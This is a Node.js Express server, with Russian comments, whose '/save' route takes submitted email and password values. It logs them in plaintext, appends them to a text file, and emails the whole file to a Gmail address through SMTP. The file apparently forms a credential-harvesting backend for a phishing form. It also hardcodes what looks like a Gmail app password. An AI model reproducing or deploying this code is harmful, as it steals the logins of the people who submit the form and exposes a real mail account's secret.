const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
const fs = require('fs');
const nodemailer = require('nodemailer');


const app = express();
const PORT = process.env.PORT || 3000;
const favicon = require('serve-favicon');

app.use(favicon(path.join(__dirname, 'public', 'favicon.ico')));
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));
app.set('views', path.join(__dirname, 'views'));
app.set('view engine', 'ejs');
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

const dataDirectory = path.join(__dirname, 'data');

app.get('/favicon.ico', (req, res) => res.status(204));


app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.post('/save', async (req, res) => {
  console.log('Received form data:', req.body);
  const { email, password } = req.body;
  console.log('Extracted email:', email);
  console.log('Extracted password:', password);
  try {
    if (!email || !password) {
      throw new Error('Получены некорректные значения email и/или password');
    }

    // Здесь можно выполнить действия с данными, например, сохранение в файл
    saveDataToFile(email, password);
    try {
      // Отправка электронного письма
      await sendEmailWithData(email);

      // Отправляем ответ клиенту, например, рендеринг страницы "save"
      res.render('save', { email });
    } catch (error) {
      console.error('Ошибка при отправке по электронной почте:', error);
      res.status(500).send('Ошибка при отправке по электронной почте');
    }
  } catch (error) {
    console.error('Ошибка при обработке формы:', error);
    res.status(400).send('Ошибка при обработке формы: ' + error.message);
  }
});


function saveDataToFile(email, password) {
  const filePath = path.join(dataDirectory, 'userData.txt');
  const userData = `Email: ${email}, Password: ${password}\n`;

  fs.appendFile(filePath, userData, (err) => {
    if (err) {
      console.error('Ошибка при сохранении данных в файл:', err);
    } else {
      console.log('Данные успешно сохранены в файл:', filePath);
    }
  });
}

async function sendEmailWithData(email) {
  const transporter = nodemailer.createTransport({
    host: 'smtp.gmail.com',
    port: 465,
    secure: true,
    auth: {
      user: 'techpriest2021@gmail.com',
      pass: 'gwvl bffy libe evga'
    }
  });

  const mailOptions = {
    from: 'techpriest2021@gmail.com',
    to: 'techpriest2021@gmail.com',
    subject: 'Данные с сайта',
    text: 'Прикреплен файл с данными',
    attachments: [
      {
        filename: 'userData.txt',
        path: path.join(dataDirectory, 'userData.txt')
      }
    ]
  };

  const info = await transporter.sendMail(mailOptions);
  console.log('Email успешно отправлен:', info.response);
}



app.listen(PORT, () => {
  console.log(`Сервер запущен на http://localhost:${PORT}`);
});
